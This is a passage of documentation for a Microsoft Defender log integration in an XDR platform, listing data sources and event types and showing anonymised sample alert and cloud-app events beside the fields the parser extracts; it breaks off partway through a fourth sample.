
### Event Categories


The following table lists the data source offered by this integration.

| Data Source | Description                          |
| ----------- | ------------------------------------ |
| `Binary file metadata` | Microsoft Defender for Endpoint monitors files |
| `Disk forensics` | Microsoft Defender for Endpoint monitors devices |
| `File monitoring` | Microsoft Defender for Endpoint monitors files |
| `Host network interface` | Microsoft Defender for Endpoint monitors devices |
| `Kernel drivers` | Microsoft Defender for Endpoint monitors processes |
| `Loaded DLLs` | Microsoft Defender for Endpoint monitors processes |
| `Named Pipes` | Microsoft Defender for Endpoint monitors processes |
| `PowerShell logs` | Microsoft Defender for Endpoint monitors processes |
| `Process command-line parameters` | Microsoft Defender for Endpoint monitors processes |
| `Process monitoring` | Microsoft Defender for Endpoint monitors processes |
| `Process use of network` | Microsoft Defender for Endpoint monitors processes |
| `Services` | Microsoft Defender for Endpoint monitors processes |
| `Windows event logs` | Microsoft Defender for Endpoint watch events logs |
| `Windows Registry` | Microsoft Defender for Endpoint monitors the registry |
| `WMI Objects` | Microsoft Defender for Endpoint monitors processes |
| `Email gateway` | Microsoft Defender for O365 monitors emails |
| `OAuth audit logs` | Microsoft Defender for Cloud App monitors users, entity behavior and activities |
| `Authentication logs` | Microsoft Defender for Identity monitors users, entity behavior and activities |
| `Asset management` | Microsoft Defender for Identity monitors users identity and credentials |





In details, the following table denotes the type of events produced by this integration.

| Name | Values |
| ---- | ------ |
| Kind | `alert`, `enrichment` |
| Category | `authentication`, `connection`, `email`, `file`, `host`, `iam`, `intrusion_detection`, `network`, `process`, `threat`, `web` |
| Type | `indicator`, `info`, `user` |




### Transformed Events Samples after Ingestion

This section demonstrates how the raw logs will be transformed by our parsers. It shows the extracted fields that will be available for use in the [built-in detection rules](/xdr/features/detect/rules_catalog.md) and hunting activities in the [events page](/xdr/features/investigate/events.md). Understanding these transformations is essential for analysts to create effective detection mechanisms with [custom detection rules](/xdr/features/detect/sigma.md) and to leverage the full potential of the collected data.

=== "test_additional_fields_error1.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-10-01T08:25:13.7165282Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-CloudAppEvents\",\"_TimeReceivedBySvc\":\"2024-10-01T08:22:28.4690000Z\",\"properties\":{\"ActionType\":\"Send\",\"ApplicationId\":20893,\"AccountDisplayName\":\"jDOE microsoft graph\",\"AccountObjectId\":null,\"AccountId\":\"11111111-1111-1111-1111-111111111111\",\"DeviceType\":\"Other\",\"OSPlatform\":\"Unknown\",\"IPAddress\":\"1.1.1.1\",\"IsAnonymousProxy\":false,\"CountryCode\":\"FR\",\"City\":\"Paris\",\"ISP\":\"Microsoft 365 Common and Office Online server\",\"UserAgent\":\"Client=Client;Client=Client;;\",\"IsAdminOperation\":false,\"ActivityObjects\":[{\"Type\":\"Account\",\"Role\":\"Actor\",\"Name\":\"jDOE microsoft graph\",\"Id\":\"55555555-5555-5555-5555-555555555555\",\"ApplicationId\":11166,\"ApplicationInstance\":0},{\"Type\":\"Structured object\",\"Role\":\"Parameter\",\"ServiceObjectType\":\"Session ID\"},{\"Type\":\"Task\",\"Role\":\"Target object\",\"Name\":\"Send\"},{\"Type\":\"User\",\"Role\":\"Parameter\",\"Name\":\"noreply jDOE\",\"Id\":\"44444444-4444-4444-4444-444444444444\",\"ApplicationId\":11166,\"ApplicationInstance\":0}],\"AdditionalFields\":{\"Source Mac\":\"02:22:33:44:55:66\"},\"ActivityType\":\"Run\",\"ObjectName\":\"Send\",\"ObjectType\":\"Task\",\"ObjectId\":null,\"AppInstanceId\":0,\"AccountType\":\"Application\",\"IsExternalUser\":false,\"IsImpersonated\":false,\"IPTags\":[\"Microsoft 365 Common and Office Online server\",\"Microsoft Azure\",\"Microsoft 365\"],\"IPCategory\":\"Cloud provider\",\"UserAgentTags\":null,\"RawEventData\":{\"AppId\":\"66666666-6666-6666-6666-666666666666\",\"ClientAppId\":\"55555555-5555-5555-5555-555555555555\",\"ClientIP\":\"1.1.1.1\",\"ClientIPAddress\":\"1.1.1.1 \",\"ClientInfoString\":\"Client=Client;Client=ClientSystem;;\",\"ClientRequestId\":\"22222222-2222-2222-2222-222222222222\",\"CreationTime\":\"2024-10-01T08:18:26Z\",\"ExternalAccess\":false,\"Id\":\"33333333-3333-3333-3333-333333333333\",\"InternalLogonType\":0,\"Item\":{\"Id\":\"RgAAAACAAAAAAAAAAAAAAAAAAncHuoKBwCQDhyvSYsvTYNL\",\"ImmutableId\":\"LgAAAAAAAAAAAAAAAAAAAAAAADQCQDhyvSYsvTYNLegb6cgrxAAAo4zpzAAAJ\",\"InternetMessageId\":\"<test.JDOE.outlook.com>\",\"ParentFolder\":{\"Id\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAQCQDhyvSYsvTYNLegb6cgrxAAAAAAEPAAAB\",\"Path\":\"\\\\\\\\Drafts\"},\"SizeInBytes\":4199,\"Subject\":\"subject test\"},\"LogonType\":0,\"LogonUserSid\":\"S-1-1-11-33333333333-222222222-66666666666-9341774\",\"MailboxGuid\":\"77777777-7777-7777-7777-777777777777\",\"MailboxOwnerMasterAccountSid\":\"S-1-1-11\",\"MailboxOwnerSid\":\"S-1-1-11-33333333333-222222222-66666666666-9341774\",\"MailboxOwnerUPN\":\"noreply@test.co\",\"Operation\":\"Send\",\"OrganizationId\":\"11111111-1111-1111-1111-111111111111\",\"OrganizationName\":\"test.onmicrosoft.com\",\"OriginatingServer\":\"SN7PR11MB0000(5.6.7700.000)\\\\r\\\\n\",\"RecordType\":2,\"ResultStatus\":\"Succeeded\",\"SaveToSentItems\":true,\"UserId\":\"noreply@test.co\",\"UserKey\":\"55555555-5555-5555-5555-555555555555\",\"UserType\":5,\"Version\":1,\"Workload\":\"Exchange\"},\"ReportId\":\"22222222-2222-2222-2222-a036-08dce1f19ff1\",\"Timestamp\":\"2024-10-01T08:18:26Z\",\"Application\":\"Microsoft Exchange Online\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "network"
            ],
            "dataset": "cloud_app_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-10-01T08:18:26Z",
        "action": {
            "name": "Publish",
            "properties": {
                "Application": "Microsoft Exchange Online",
                "ApplicationId": "20893",
                "IPCategory": "Cloud provider",
                "IPTags": [
                    "Microsoft 365",
                    "Microsoft 365 Common and Office Online server",
                    "Microsoft Azure"
                ],
                "ISP": "Microsoft 365 Common and Office Online server",
                "IsAdminOperation": "false",
                "IsAnonymousProxy": "false",
                "IsExternalUser": false,
                "IsImpersonated": false,
                "ObjectName": "Send",
                "ObjectType": "Task",
                "RawEventData": "{\"AppId\":\"66666666-6666-6666-6666-666666666666\",\"ClientAppId\":\"55555555-5555-5555-5555-555555555555\",\"ClientIP\":\"1.1.1.1\",\"ClientIPAddress\":\"1.1.1.1 \",\"ClientInfoString\":\"Client=Client;Client=ClientSystem;;\",\"ClientRequestId\":\"22222222-2222-2222-2222-222222222222\",\"CreationTime\":\"2024-10-01T08:18:26Z\",\"ExternalAccess\":false,\"Id\":\"33333333-3333-3333-3333-333333333333\",\"InternalLogonType\":0,\"Item\":{\"Id\":\"RgAAAACAAAAAAAAAAAAAAAAAAncHuoKBwCQDhyvSYsvTYNL\",\"ImmutableId\":\"LgAAAAAAAAAAAAAAAAAAAAAAADQCQDhyvSYsvTYNLegb6cgrxAAAo4zpzAAAJ\",\"InternetMessageId\":\"<test.JDOE.outlook.com>\",\"ParentFolder\":{\"Id\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAQCQDhyvSYsvTYNLegb6cgrxAAAAAAEPAAAB\",\"Path\":\"\\\\\\\\Drafts\"},\"SizeInBytes\":4199,\"Subject\":\"subject test\"},\"LogonType\":0,\"LogonUserSid\":\"S-1-1-11-33333333333-222222222-66666666666-9341774\",\"MailboxGuid\":\"77777777-7777-7777-7777-777777777777\",\"MailboxOwnerMasterAccountSid\":\"S-1-1-11\",\"MailboxOwnerSid\":\"S-1-1-11-33333333333-222222222-66666666666-9341774\",\"MailboxOwnerUPN\":\"noreply@test.co\",\"Operation\":\"Send\",\"OrganizationId\":\"11111111-1111-1111-1111-111111111111\",\"OrganizationName\":\"test.onmicrosoft.com\",\"OriginatingServer\":\"SN7PR11MB0000(5.6.7700.000)\\\\r\\\\n\",\"RecordType\":2,\"ResultStatus\":\"Succeeded\",\"SaveToSentItems\":true,\"UserId\":\"noreply@test.co\",\"UserKey\":\"55555555-5555-5555-5555-555555555555\",\"UserType\":5,\"Version\":1,\"Workload\":\"Exchange\"}"
            },
            "type": "Send"
        },
        "host": {
            "os": {
                "full": "Unknown"
            },
            "type": "Other"
        },
        "microsoft": {
            "defender": {
                "activity": {
                    "objects": [
                        {
                            "ApplicationId": 11166,
                            "ApplicationInstance": 0,
                            "Id": "55555555-5555-5555-5555-555555555555",
                            "Name": "jDOE microsoft graph",
                            "Role": "Actor",
                            "Type": "Account"
                        },
                        {
                            "Role": "Parameter",
                            "ServiceObjectType": "Session ID",
                            "Type": "Structured object"
                        },
                        {
                            "Name": "Send",
                            "Role": "Target object",
                            "Type": "Task"
                        },
                        {
                            "ApplicationId": 11166,
                            "ApplicationInstance": 0,
                            "Id": "44444444-4444-4444-4444-444444444444",
                            "Name": "noreply jDOE",
                            "Role": "Parameter",
                            "Type": "User"
                        }
                    ],
                    "type": "Run"
                },
                "report": {
                    "id": "22222222-2222-2222-2222-a036-08dce1f19ff1"
                }
            }
        },
        "related": {
            "ip": [
                "1.1.1.1"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "geo": {
                "city_name": "Paris"
            },
            "ip": "1.1.1.1"
        },
        "user": {
            "full_name": "jDOE microsoft graph"
        },
        "user_agent": {
            "device": {
                "name": "Other"
            },
            "name": "Other",
            "original": "Client=Client;Client=Client;;",
            "os": {
                "name": "Other"
            }
        }
    }
    	
	```


=== "test_alert_evidence.json"

    ```json
	
    {
        "message": "{\"time\":\"2023-09-28T16:17:08.7649196Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-AlertEvidence\",\"properties\":{\"Timestamp\":\"2023-09-28T16:15:29.9227997Z\",\"AlertId\":\"da33333333-3333-3333-3333-333333333333_1\",\"EntityType\":\"Process\",\"EvidenceRole\":\"Related\",\"SHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"SHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"RemoteIP\":null,\"LocalIP\":null,\"RemoteUrl\":null,\"AccountName\":null,\"AccountDomain\":null,\"AccountSid\":null,\"AccountObjectId\":null,\"DeviceId\":null,\"ThreatFamily\":null,\"EvidenceDirection\":null,\"AdditionalFields\":\"{\\\"$id\\\":\\\"1\\\",\\\"ProcessId\\\":\\\"19060\\\",\\\"CommandLine\\\":\\\"splwow64.exe 8192\\\",\\\"ElevationToken\\\":\\\"Default\\\",\\\"CreationTimeUtc\\\":\\\"2023-09-28T16:15:28.7714877Z\\\",\\\"ImageFile\\\":{\\\"$id\\\":\\\"2\\\",\\\"Directory\\\":\\\"C:\\\\\\\\Windows\\\",\\\"Name\\\":\\\"splwow64.exe\\\",\\\"Host\\\":{\\\"$id\\\":\\\"3\\\",\\\"DnsDomain\\\":\\\"example.org\\\",\\\"HostName\\\":\\\"vm0242\\\",\\\"NetBiosName\\\":\\\"vm0242.example.org\\\",\\\"OSFamily\\\":\\\"Windows\\\",\\\"OSVersion\\\":\\\"10.0\\\",\\\"IsDomainJoined\\\":true,\\\"IpInterfaces\\\":[{\\\"$id\\\":\\\"4\\\",\\\"Address\\\":\\\"1.1.1.1\\\",\\\"Type\\\":\\\"ip\\\"},{\\\"$id\\\":\\\"5\\\",\\\"Address\\\":\\\"22b0:8f31:eff3:7b6e:3277:2f79:ca62:7ec0\\\",\\\"Type\\\":\\\"ip\\\"},{\\\"$id\\\":\\\"6\\\",\\\"Address\\\":\\\"127.0.0.1\\\",\\\"Type\\\":\\\"ip\\\"},{\\\"$id\\\":\\\"7\\\",\\\"Address\\\":\\\"::1\\\",\\\"Type\\\":\\\"ip\\\"}],\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2023-09-28T16:16:56.6015218Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2023-09-28T16:16:56.6015218Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"Metadata\\\":{\\\"MachineEnrichmentInfo\\\":\\\"{\\\\\\\"MachineId\\\\\\\":\\\\\\\"7e7a44995a4d4f09be53dce4fe9eb1db\\\\\\\",\\\\\\\"HostName\\\\\\\":\\\\\\\"vm0242\\\\\\\",\\\\\\\"DnsDomain\\\\\\\":\\\\\\\"example.org\\\\\\\",\\\\\\\"IpAddress\\\\\\\":null,\\\\\\\"FoundBy\\\\\\\":[3],\\\\\\\"LastSeen\\\\\\\":\\\\\\\"2023-09-28T06:59:18.6059012Z\\\\\\\",\\\\\\\"RbacGroupId\\\\\\\":0,\\\\\\\"MachineTagsJson\\\\\\\":null,\\\\\\\"MachineGroup\\\\\\\":null,\\\\\\\"OsPlatform\\\\\\\":\\\\\\\"Windows10\\\\\\\",\\\\\\\"SenseClientVersion\\\\\\\":\\\\\\\"10.8570.19045.3448\\\\\\\"}\\\"},\\\"Asset\\\":true,\\\"DetailedRoles\\\":[\\\"PrimaryDevice\\\"],\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"0\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"host\\\",\\\"LeadingHost\\\":true,\\\"Role\\\":0,\\\"MachineId\\\":\\\"7e7a44995a4d4f09be53dce4fe9eb1db\\\",\\\"MachineIdType\\\":3,\\\"HostMachineId\\\":null,\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"EnrichmentType\\\":\\\"MachineIpInterfacesEnrichment\\\",\\\"IsIoc\\\":false,\\\"MergeByKey\\\":\\\"6JC4Lo9GK4MkdUKN6MFPCSfA/no=\\\",\\\"MergeByKeyHex\\\":\\\"E890B82E8F462B832475428DE8C14F0927C0FE7A\\\"},\\\"SizeInBytes\\\":163840,\\\"FileHashes\\\":[{\\\"$id\\\":\\\"8\\\",\\\"Algorithm\\\":\\\"SHA1\\\",\\\"Value\\\":\\\"f1d50e0d3e0ba197baf152614e0cd94487a1142e\\\",\\\"Type\\\":\\\"filehash\\\"},{\\\"$id\\\":\\\"9\\\",\\\"Algorithm\\\":\\\"MD5\\\",\\\"Value\\\":\\\"9b77f02583b95c7c5fe59ab2884f2817\\\",\\\"Type\\\":\\\"filehash\\\"},{\\\"$id\\\":\\\"10\\\",\\\"Algorithm\\\":\\\"SHA256\\\",\\\"Value\\\":\\\"eb3fd3d0548771153565acd49edf4667a576959b8e265be7c0061017c6479232\\\",\\\"Type\\\":\\\"filehash\\\"}],\\\"CreatedTimeUtc\\\":\\\"2023-09-22T07:12:05.262923Z\\\",\\\"Type\\\":\\\"file\\\",\\\"LsHash\\\":\\\"6fe9d57dbf6d9a5a77d9a667ebddf556df977bda6ef576dd7e67b5ae5e95665db77e9bd9fefbdeaae6ba9f55a56eae99b5ef9fa6bdaebfa7b95a5bd9f9df7bfa\\\",\\\"IsPe\\\":true,\\\"LastAccessTimeUtc\\\":\\\"2023-09-28T16:15:28.8773106Z\\\",\\\"LastWriteTimeUtc\\\":\\\"2023-09-22T07:12:05.2726183Z\\\",\\\"Publisher\\\":\\\"Microsoft Corporation\\\",\\\"KnownPrevalence\\\":151790,\\\"FirstSeen\\\":\\\"2023-08-22T17:20:03.9270115\\\"},\\\"Account\\\":{\\\"$id\\\":\\\"11\\\",\\\"Name\\\":\\\"mgarcia\\\",\\\"NTDomain\\\":\\\"EXAMPLE\\\",\\\"UPNSuffix\\\":\\\"example.org\\\",\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"Sid\\\":\\\"S-1-5-21-111111111-222222222-333333333-44444\\\",\\\"AadUserId\\\":\\\"22222222-2222-2222-2222-222222222222\\\",\\\"IsDomainJoined\\\":true,\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2023-09-28T16:16:56.6015218Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2023-09-28T16:16:56.6015218Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"Asset\\\":true,\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"0\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"account\\\",\\\"UserPrincipalName\\\":\\\"jane.doe@example.org\\\",\\\"Role\\\":0,\\\"ReferenceId\\\":\\\"44444444-4444-4444-4444-444444444444:ae2bc63238bc\\\",\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":true,\\\"MergeByKey\\\":\\\"rRAMCzzVjzarq8zZIW8y9uZLSWg=\\\",\\\"MergeByKeyHex\\\":\\\"AD100C0B3CD58F36ABABCCD9216F32F6E64B4968\\\"},\\\"ParentProcess\\\":{\\\"$id\\\":\\\"12\\\",\\\"ProcessId\\\":\\\"12636\\\",\\\"CreationTimeUtc\\\":\\\"2023-09-28T16:15:23.5645558Z\\\",\\\"ImageFile\\\":{\\\"$id\\\":\\\"13\\\",\\\"Directory\\\":\\\"\\\\\\\\Device\\\\\\\\HarddiskVolume3\\\\\\\\Program Files (x86)\\\\\\\\Adobe\\\\\\\\Acrobat Reader DC\\\\\\\\Reader\\\",\\\"Name\\\":\\\"AcroRd32.exe\\\",\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"Type\\\":\\\"file\\\"},\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"CreatedTimeUtc\\\":\\\"2023-09-28T16:15:23.5645558Z\\\",\\\"Type\\\":\\\"process\\\"},\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"CreatedTimeUtc\\\":\\\"2023-09-28T16:15:28.7714877Z\\\",\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2023-09-28T16:16:56.6015218Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2023-09-28T16:16:56.6015218Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"0\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"process\\\",\\\"ReferenceId\\\":\\\"44444444-4444-4444-4444-444444444444:12b768c23b3c\\\",\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":true,\\\"Role\\\":1,\\\"MergeByKey\\\":\\\"Hzs5K5cl+LUGa+UuGO44Y6a9Z9I=\\\",\\\"MergeByKeyHex\\\":\\\"1F3B392B9725F8B5066BE52E18EE3863A6BD67D2\\\"}\",\"MachineGroup\":null,\"NetworkMessageId\":null,\"ServiceSource\":\"Microsoft Defender for Endpoint\",\"FileName\":\"splwow64.exe\",\"FolderPath\":\"C:\\\\Windows\",\"ProcessCommandLine\":\"splwow64.exe 8192\",\"EmailSubject\":null,\"ApplicationId\":null,\"Application\":null,\"DeviceName\":null,\"FileSize\":163840,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"AccountUpn\":null,\"OAuthApplicationId\":null,\"Categories\":\"[\\\"InitialAccess\\\"]\",\"Title\":\"Executable content from email blocked\",\"AttackTechniques\":\"[\\\"Masquerading (T1036)\\\",\\\"Taint Shared Content (T1080)\\\",\\\"User Execution (T1204)\\\",\\\"System Binary Proxy Execution (T1218)\\\",\\\"Internal Spearphishing (T1534)\\\",\\\"Spearphishing Attachment (T1566.001)\\\",\\\"Spearphishing via Service (T1566.003)\\\"]\",\"DetectionSource\":\"Antivirus\",\"Severity\":\"Low\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "threat"
            ],
            "dataset": "alert_evidence",
            "kind": "enrichment",
            "type": [
                "indicator"
            ]
        },
        "@timestamp": "2023-09-28T16:15:29.922799Z",
        "action": {
            "name": "Publish",
            "properties": {
                "ServiceSource": "Microsoft Defender for Endpoint"
            }
        },
        "file": {
            "directory": "C:\\Windows",
            "hash": {
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "splwow64.exe",
            "size": 163840
        },
        "microsoft": {
            "defender": {
                "alert": {
                    "id": "da33333333-3333-3333-3333-333333333333_1",
                    "severity": "Low",
                    "title": "Executable content from email blocked"
                },
                "entity": {
                    "type": "Process"
                },
                "evidence": {
                    "role": "Related"
                },
                "threat": {
                    "detection_status": "Detected",
                    "last_remediation_state": "Active",
                    "remediation_providers": [
                        {
                            "RemediationDate": "2023-09-28T16:16:56.6015218Z",
                            "RemediationState": "Active",
                            "Type": "remediation-provider"
                        }
                    ],
                    "severity": "Low",
                    "suspicion_level": "Suspicious"
                }
            }
        },
        "process": {
            "args": [
                "8192"
            ],
            "command_line": "splwow64.exe 8192",
            "name": "splwow64.exe",
            "parent": {
                "pid": 12636
            },
            "pid": 19060
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ]
        },
        "service": {
            "name": "Microsoft Defender for Endpoint",
            "type": "Antivirus"
        }
    }
    	
	```


=== "test_alert_evidence_2.json"

    ```json
	
    {
        "message": "{\"time\":\"2023-09-26T13:04:41.9797846Z\",\"tenantId\":\"33333333-3333-3333-3333-333333333333\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-AlertEvidence\",\"properties\":{\"Timestamp\":\"2023-09-26T13:03:18Z\",\"AlertId\":\"fa11111111-1111-1111-1111-111111111111\",\"EntityType\":\"MailMessage\",\"EvidenceRole\":\"Related\",\"SHA1\":null,\"SHA256\":null,\"RemoteIP\":null,\"LocalIP\":null,\"RemoteUrl\":null,\"AccountName\":null,\"AccountDomain\":null,\"AccountSid\":null,\"AccountObjectId\":null,\"DeviceId\":null,\"ThreatFamily\":null,\"EvidenceDirection\":null,\"AdditionalFields\":\"{\\\"$id\\\":\\\"1\\\",\\\"Recipient\\\":\\\"john.doe@example.org\\\",\\\"Sender\\\":\\\"no-reply@example.org\\\",\\\"SenderIP\\\":\\\"1.1.1.1\\\",\\\"P2Sender\\\":\\\"no-reply@example.org\\\",\\\"ReceivedDate\\\":\\\"2023-09-26T13:02:18Z\\\",\\\"NetworkMessageId\\\":\\\"22222222-2222-2222-2222-222222222222\\\",\\\"InternetMessageId\\\":\\\"<55555555-5555-5555-5555-555555555555bc0bb8d-bd55-466f-92ec-46cc66108821b@intranet.domain>\\\",\\\"Subject\\\":\\\"My little subject\\\",\\\"StartTimeUtc\\\":\\\"2023-09-26T13:01:18Z\\\",\\\"EndTimeUtc\\\":\\\"2023-09-26T13:03:18Z\\\",\\\"EntitySources\\\":[\\\"Alert\\\"],\\\"Type\\\":\\\"mailMessage\\\",\\\"Urn\\\":null,\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"0001-01-01T00:00:00\\\",\\\"SourceEntityType\\\":\\\"MalwareFamily\\\",\\\"SourceEntityId\\\":\\\"44444444-4444-4444-4444-444444444444-1\\\",\\\"SourceThreatType\\\":\\\"Phish, Malicious\\\",\\\"SourceThreatName\\\":\\\"Phish, Malicious\\\",\\\"Role\\\":1,\\\"AttachmentCount\\\":0,\\\"UrlCount\\\":0,\\\"MergeByKey\\\":\\\"XI3qGjU8yzWpxMk1QhDqq5R13s4=\\\",\\\"MergeByKeyHex\\\":\\\"5C8DEA1A353CCB35A9C4C9354210EAAB9475DECE\\\"}\",\"MachineGroup\":null,\"NetworkMessageId\":\"22222222-2222-2222-2222-222222222222\",\"ServiceSource\":\"Microsoft Defender for Office 365\",\"FileName\":null,\"FolderPath\":null,\"ProcessCommandLine\":null,\"EmailSubject\":\"ANONYMIZED\",\"ApplicationId\":null,\"Application\":null,\"DeviceName\":null,\"FileSize\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"AccountUpn\":null,\"OAuthApplicationId\":null,\"Categories\":\"[\\\"InitialAccess\\\"]\",\"Title\":\"Phish delivered due to an IP allow policy\",\"AttackTechniques\":\"[\\\"Phishing (T1566)\\\"]\",\"DetectionSource\":\"Microsoft Defender for Office 365\",\"Severity\":\"Informational\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "threat"
            ],
            "dataset": "alert_evidence",
            "kind": "enrichment",
            "type": [
                "indicator"
            ]
        },
        "@timestamp": "2023-09-26T13:03:18Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AttachmentCount": 0,
                "ServiceSource": "Microsoft Defender for Office 365",
                "UrlCount": 0
            }
        },
        "email": {
            "local_id": "22222222-2222-2222-2222-222222222222",
            "message_id": "55555555-5555-5555-5555-555555555555bc0bb8d-bd55-466f-92ec-46cc66108821b@intranet.domain",
            "sender": {
                "address": "no-reply@example.org"
            },
            "subject": "ANONYMIZED",
            "to": {
                "address": [
                    "john.doe@example.org"
                ]
            }
        },
        "microsoft": {
            "defender": {
                "alert": {
                    "id": "fa11111111-1111-1111-1111-111111111111",
                    "severity": "Informational",
                    "title": "Phish delivered due to an IP allow policy"
                },
                "entity": {
                    "type": "MailMessage"
                },
                "evidence": {
                    "role": "Related"
                },
                "threat": {
                    "severity": "Informational"
                }
            }
        },
        "service": {
            "name": "Microsoft Defender for Office 365",
            "type": "Microsoft Defender for Office 365"
        }
    }
    	
	```


=== "test_alert_evidence_3.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-03-13T12:57:23.9020375Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-AlertEvidence\",\"properties\":{\"Timestamp\":\"2024-03-13T12:57:00Z\",\"AlertId\":\"44444444-4444-4444-4444-444444444444\",\"EntityType\":\"Mailbox\",\"EvidenceRole\":\"Impacted\",\"SHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"SHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"RemoteIP\":\"2.2.2.2\",\"LocalIP\":\"1.1.1.1\",\"RemoteUrl\":null,\"AccountName\":\"john.doe\",\"AccountDomain\":\"example\",\"AccountSid\":\"S-1-5-21-1111111111-222222222-444444444-333333\",\"AccountObjectId\":\"user1\",\"DeviceId\":null,\"ThreatFamily\":null,\"EvidenceDirection\":null,\"AdditionalFields\":\"{\\\"MailboxPrimaryAddress\\\":\\\"john.doe@example.com\\\",\\\"DisplayName\\\":\\\"DOEJohn\\\",\\\"Upn\\\":\\\"john.doe@example.com\\\",\\\"AadId\\\":\\\"33333333-3333-3333-3333-333333333333\\\",\\\"RiskLevel\\\":\\\"None\\\",\\\"StartTimeUtc\\\":\\\"2024-03-13T12:55:00Z\\\",\\\"EndTimeUtc\\\":\\\"2024-03-13T12:57:00Z\\\",\\\"EntitySources\\\":[\\\"Alert\\\"],\\\"Type\\\":\\\"mailbox\\\",\\\"Urn\\\":\\\"urn:UserEntity:68b329da9893e34099c7d8ad5cb9c940\\\",\\\"Source\\\":\\\"OATP\\\",\\\"FirstSeen\\\":\\\"0001-01-01T00:00:00\\\",\\\"SourceEntityType\\\":\\\"MalwareFamily\\\",\\\"SourceEntityId\\\":\\\"22222222-2222-2222-2222-222222222222\\\",\\\"SourceThreatType\\\":\\\"Phish,Malicious\\\",\\\"SourceThreatName\\\":\\\"Phish,Malicious\\\",\\\"UserSid\\\":\\\"S-1-5-21-1111111111-222222222-444444444-333333\\\",\\\"AccountName\\\":\\\"john.doe\\\",\\\"DomainName\\\":\\\"example\\\",\\\"Role\\\":0,\\\"MergeByKey\\\":\\\"P/0zPBzZgl+0ob6ZK60I7fmCbPU=\\\",\\\"MergeByKeyHex\\\":\\\"3FFD333C1CD9825FB4A1BE992BAD08EDF9826CF5\\\"}\",\"MachineGroup\":null,\"NetworkMessageId\":null,\"ServiceSource\":\"MicrosoftDefenderforOffice365\",\"FileName\":\"splwow64.exe\",\"FolderPath\":\"C:\\\\W